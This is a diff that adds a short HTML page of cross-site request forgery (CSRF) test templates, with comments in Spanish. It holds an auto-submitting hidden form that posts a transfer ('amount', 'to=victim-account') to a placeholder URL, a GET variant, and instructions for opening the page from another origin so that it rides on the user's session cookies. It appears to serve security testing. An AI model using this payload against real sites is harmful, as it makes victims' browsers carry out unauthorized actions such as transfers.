@@ -1,0 +1,21 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>CSRF Example Templates</title>
+  </head>
+  <body>
+    <h3>Plantilla CSRF (auto-submit)</h3>
+    <!-- Reemplaza ACTION_URL y parámetros según la acción que quieres probar -->
+    <form id="f" action="ACTION_URL" method="POST">
+      <input type="hidden" name="amount" value="1" />
+      <input type="hidden" name="to" value="victim-account" />
+    </form>
+    <script>document.getElementById('f').submit();</script>
+
+    <h3>Plantilla GET (indicada para endpoints que aceptan GET para acciones)</h3>
+    <a id="g" href="ACTION_GET_URL">Probar GET CSRF</a>
+
+    <p>Instrucciones: Guarda este archivo y ábrelo desde un origen distinto al objetivo (p.e. local file:// o http://localhost:port) para simular un sitio atacante que auto-envía peticiones al objetivo con cookies de sesión del usuario.</p>
+  </body>
+  </html>
